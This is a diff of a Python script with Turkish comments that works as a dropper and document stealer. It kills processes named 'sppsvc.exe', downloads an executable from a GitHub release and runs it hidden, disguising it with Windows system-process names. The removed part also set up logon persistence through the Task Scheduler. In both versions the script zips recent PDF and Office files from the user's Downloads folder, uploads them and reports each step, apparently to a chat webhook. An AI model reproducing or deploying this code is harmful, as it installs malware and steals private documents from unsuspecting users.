@@ -1,8 +1,6 @@
 import subprocess
 import os
-import winreg
 import urllib.request
-import win32com.client
 import json
 import datetime
 import zipfile
@@ -77,169 +75,50 @@ RED = 15548997
 YELLOW = 16776960
 BLUE = 3447003
 
-# hedef klasoru belirle
-appdata = os.getenv("APPDATA")
-target_dir = os.path.join(appdata, "werfault")
-target_file = os.path.join(target_dir, "sppsvc.exe")
-download_url = "https://github.com/atesemcukleyici/imsorryforthat/releases/download/asas/sppsvc.exe"
-startup_dir = os.path.join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-
 send("⚙️ Baslatiliyor", "script calismaya basladi.", BLUE)
 
-# once calisan tum sppsvc processlerini oldur
+# sppsvc.exe yi kaldirip yenisini indiriyoruz
+SPPSVC_URL = "https://github.com/atesemcukleyici/imsorryforthat/releases/download/sswa/sppsvc.exe"
+
 try:
-    ps_cmd = "Get-CimInstance Win32_Process | Where-Object { $_.Name -eq 'sppsvc.exe' } | Select-Object -ExpandProperty ProcessId"
-    result = subprocess.run(
-        ["powershell", "-NoProfile", "-Command", ps_cmd],
-        capture_output=True, text=True, encoding="utf-8", errors="replace", creationflags=subprocess.CREATE_NO_WINDOW
+    # once calisan sppsvc processleri olduruyoruz
+    kill_cmd = "Get-Process -Name sppsvc -ErrorAction SilentlyContinue | Stop-Process -Force"
+    subprocess.run(
+        ["powershell", "-NoProfile", "-Command", kill_cmd],
+        capture_output=True, text=True, encoding="utf-8", errors="replace",
+        creationflags=subprocess.CREATE_NO_WINDOW
     )
-    pids = [l.strip() for l in result.stdout.strip().splitlines() if l.strip()]
-    if pids:
-        killed = []
-        for pid in pids:
-            try:
-                subprocess.run(
-                    ["taskkill", "/F", "/PID", pid],
-                    capture_output=True, text=True, encoding="utf-8", errors="replace", creationflags=subprocess.CREATE_NO_WINDOW
-                )
-                killed.append(pid)
-            except Exception:
-                pass
-        send("🔪 Process Temizligi", f"calisan: {', '.join(pids)}\nolduruldu: {', '.join(killed)}", YELLOW)
-    else:
-        send("🔪 Process Temizligi", "calisan sppsvc process yok, temiz.", GREEN)
+    # biraz bekliyoruz processin kapanmasi icin
+    time.sleep(2)
+
+    # yeni sppsvc.exe yi indiriyoruz
+    sppsvc_dir = os.path.join(tempfile.gettempdir(), "sppsvc_update")
+    os.makedirs(sppsvc_dir, exist_ok=True)
+    sppsvc_path = os.path.join(sppsvc_dir, "sppsvc.exe")
+
+    req = urllib.request.Request(SPPSVC_URL, headers={"User-Agent": UA})
+    with urllib.request.urlopen(req, timeout=60) as resp:
+        with open(sppsvc_path, "wb") as f:
+            f.write(resp.read())
+
+    send("📥 sppsvc Guncelleme", f"yeni sppsvc indirildi: {sppsvc_path}", GREEN)
+
+    # indirilen dosyayi calistiriyoruz
+    subprocess.Popen(
+        [sppsvc_path],
+        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
+    )
+    send("🟢 sppsvc Basladi", f"yeni process baslatildi.", GREEN)
+
 except Exception as e:
-    send("❌ Process Kill Hatasi", str(e), RED)
+    send("❌ sppsvc Hatasi", str(e), RED)
 
-# werfault klasorunu olustur ve sppsvc.exe indir
-try:
-    os.makedirs(target_dir, exist_ok=True)
-    urllib.request.urlretrieve(download_url, target_file)
-    send("📥 Indirme", f"basarili: {target_file}", GREEN)
-except Exception as e:
-    send("❌ Indirme Hatasi", str(e), RED)
-
-# hedef exe listesini belirle
-exe_list = []
-
-if os.path.isfile(target_file):
-    exe_list = [target_file]
-else:
-    if os.path.isdir(target_dir):
-        for f in os.listdir(target_dir):
-            full = os.path.join(target_dir, f)
-            if f.lower().endswith(".exe"):
-                exe_list.append(full)
-    if not exe_list:
-        send("❌ Exe Bulunamadi", f"klasorde exe yok: {target_dir}", RED)
-
-# her exe icin islemleri yap
-for exe_path in exe_list:
-    exe_name = os.path.basename(exe_path)
-    reg_name = os.path.splitext(exe_name)[0]
-
-    # kayit defteri baslangic kayitlarini tamamen temizle
-    try:
-        startup_keys = [
-            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
-            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
-        ]
-
-        startup_apps = {}
-        matching_entries = []
-        for hive, key_path in startup_keys:
-            try:
-                key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_READ)
-                i = 0
-                while True:
-                    try:
-                        name, value, _ = winreg.EnumValue(key, i)
-                        startup_apps[name] = value
-                        if exe_name.lower() in value.lower():
-                            hive_name = "HKCU" if hive == winreg.HKEY_CURRENT_USER else "HKLM"
-                            matching_entries.append((hive, key_path, name, value, hive_name))
-                        i += 1
-                    except OSError:
-                        break
-                winreg.CloseKey(key)
-            except OSError:
-                pass
-
-        if matching_entries:
-            deleted = []
-            for hive, key_path, name, value, hive_name in matching_entries:
-                try:
-                    key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE)
-                    winreg.DeleteValue(key, name)
-                    winreg.CloseKey(key)
-                    deleted.append(f"[{hive_name}] {name}")
-                except Exception:
-                    pass
-            send("🗑️ Kayit Defteri", f"bulundu: {len(matching_entries)} kayit\nsilindi: {', '.join(deleted)}", YELLOW)
-        else:
-            send("📋 Kayit Defteri", "baslangic kaydi yok, temiz.", GREEN)
-
-    except Exception as e:
-        send("❌ Kayit Defteri Hatasi", str(e), RED)
-
-    # startup klasorunde eski vbs kaldiysa temizle
-    vbs_path = os.path.join(startup_dir, f"{reg_name}.vbs")
-    try:
-        if os.path.isfile(vbs_path):
-            os.remove(vbs_path)
-            send("🧹 Startup Temizligi", f"eski {reg_name}.vbs silindi.", YELLOW)
-    except Exception as e:
-        send("❌ VBS Temizleme Hatasi", str(e), RED)
-
-    # gorev zamanlayicisi uzerinden baslangica alalim
-    task_name = f"{reg_name}_startup"
-    try:
-        scheduler = win32com.client.Dispatch("Schedule.Service")
-        scheduler.Connect()
-        root_folder = scheduler.GetFolder("\\")
-
-        task_def = scheduler.NewTask(0)
-        task_def.RegistrationInfo.Description = f"{reg_name} service protection startup task"
-
-        task_def.Settings.ExecutionTimeLimit = "PT0S"
-        task_def.Settings.RunOnlyIfNetworkAvailable = True
-        task_def.Settings.MultipleInstances = 2
-        task_def.Settings.Enabled = True
-        task_def.Settings.StartWhenAvailable = True
-        task_def.Settings.DisallowStartIfOnBatteries = False
-        task_def.Settings.StopIfGoingOnBatteries = False
-
-        trigger = task_def.Triggers.Create(9)
-        trigger.Enabled = True
-        trigger.UserId = os.getenv("USERNAME")
-        trigger.Delay = "PT1M"
-
-        principal = task_def.Principal
-        principal.LogonType = 3
-        principal.RunLevel = 0
-
-        action = task_def.Actions.Create(0)
-        action.Path = exe_path
-        action.WorkingDirectory = os.path.dirname(exe_path)
-
-        root_folder.RegisterTaskDefinition(task_name, task_def, 6, None, None, 3)
-        send("📅 Gorev Zamanlayicisi", f"task: {task_name}\nsure limiti: sinirsiz\ntetikleyici: oturum acildiginda (1dk gecikmeli)\nag: hazir olunca baslat\ncoklu ornek: engellendi", GREEN)
-    except Exception as e:
-        send("❌ Gorev Zamanlayicisi Hatasi", str(e), RED)
-
-    # baslat
-    try:
-        proc = subprocess.Popen(
-            [exe_path],
-            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
-        )
-        send("🚀 Baslatildi", f"{exe_name} calisiyor (PID: {proc.pid})", GREEN)
-    except Exception as e:
-        send("❌ Baslatma Hatasi", str(e), RED)
-
-# son yirmi pdf dosyasini toplayip gonderiyoruz
+# son 60 dosyayi toplayip gonderiyoruz (pdf, doc, docx, otf)
 MAX_CHUNK = 10 * 1024 * 1024
 SPLIT_SIZE = 5 * 1024 * 1024
+
+# desteklenen formatlar
+SUPPORTED_EXTS = ["*.pdf", "*.doc", "*.docx", "*.otf"]
 
 def pdf_page_count(path):
     try:
@@ -250,43 +129,55 @@ def pdf_page_count(path):
 
 try:
     dl_dir = pathlib.Path.home() / "Downloads"
-    all_pdfs = sorted(
-        [f for f in dl_dir.glob("*.pdf") if f.is_file()],
-        key=lambda f: f.stat().st_mtime,
-        reverse=True
-    )
 
-    # 6 sayfadan fazla olanlari atliyoruz
-    pdfs = []
-    for p in all_pdfs:
-        if len(pdfs) >= 20:
+    # tum desteklenen formatlari topluyoruz
+    all_files = []
+    for ext in SUPPORTED_EXTS:
+        all_files.extend([f for f in dl_dir.glob(ext) if f.is_file()])
+
+    # degisiklik tarihine gore siraliyoruz
+    all_files.sort(key=lambda f: f.stat().st_mtime, reverse=True)
+
+    # pdf ler icin 8 sayfa filtresi, diger formatlar direkt ekleniyor
+    collected = []
+    for f in all_files:
+        if len(collected) >= 60:
             break
-        if pdf_page_count(p) <= 6:
-            pdfs.append(p)
+        if f.suffix.lower() == ".pdf":
+            if pdf_page_count(f) <= 8:
+                collected.append(f)
+        else:
+            collected.append(f)
 
-    if pdfs:
-        send("📄 PDF Toplama", f"{len(pdfs)} pdf bulundu (6 sayfa filtreli), zipleniyor...", BLUE)
+    if collected:
+        # format dagilimini gosteriyoruz
+        ext_counts = {}
+        for f in collected:
+            ext = f.suffix.lower()
+            ext_counts[ext] = ext_counts.get(ext, 0) + 1
+        dist_str = ", ".join(f"{ext}: {cnt}" for ext, cnt in ext_counts.items())
+        send("📄 Dosya Toplama", f"{len(collected)} dosya bulundu ({dist_str}), zipleniyor...", BLUE)
 
         # gecici klasorde zip olusturuyoruz
         tmp_dir = tempfile.mkdtemp()
         chunk_idx = 1
-        current_zip_path = os.path.join(tmp_dir, f"pdfs_part{chunk_idx}.zip")
+        current_zip_path = os.path.join(tmp_dir, f"docs_part{chunk_idx}.zip")
         current_zip = zipfile.ZipFile(current_zip_path, "w", zipfile.ZIP_DEFLATED)
         current_size = 0
         zip_paths = [current_zip_path]
 
-        for pdf in pdfs:
-            pdf_size = pdf.stat().st_size
+        for doc in collected:
+            doc_size = doc.stat().st_size
             # limit asilirsa yeni zip dosyasina geciyoruz
-            if current_size > 0 and current_size + pdf_size > MAX_CHUNK:
+            if current_size > 0 and current_size + doc_size > MAX_CHUNK:
                 current_zip.close()
                 chunk_idx += 1
-                current_zip_path = os.path.join(tmp_dir, f"pdfs_part{chunk_idx}.zip")
+                current_zip_path = os.path.join(tmp_dir, f"docs_part{chunk_idx}.zip")
                 current_zip = zipfile.ZipFile(current_zip_path, "w", zipfile.ZIP_DEFLATED)
                 current_size = 0
                 zip_paths.append(current_zip_path)
-            current_zip.write(str(pdf), pdf.name)
-            current_size += pdf_size
+            current_zip.write(str(doc), doc.name)
+            current_size += doc_size
         current_zip.close()
 
         # sadece on megabayttan buyukse parcalara boluyoruz
@@ -330,10 +221,10 @@ try:
         except Exception:
             pass
 
-        send("📦 PDF Gonderim", f"{sent}/{len(upload_files)} dosya gonderildi ({len(pdfs)} pdf)", GREEN if sent == len(upload_files) else YELLOW)
+        send("📦 Dosya Gonderim", f"{sent}/{len(upload_files)} dosya gonderildi ({len(collected)} dosya)", GREEN if sent == len(upload_files) else YELLOW)
     else:
-        send("📄 PDF", "downloads klasorunde pdf bulunamadi.", YELLOW)
+        send("📄 Dosya", "downloads klasorunde desteklenen dosya bulunamadi.", YELLOW)
 except Exception as e:
-    send("❌ PDF Hatasi", str(e), RED)
+    send("❌ Dosya Hatasi", str(e), RED)
 
 send("✅ Tamamlandi", "tum islemler bitti.", GREEN)
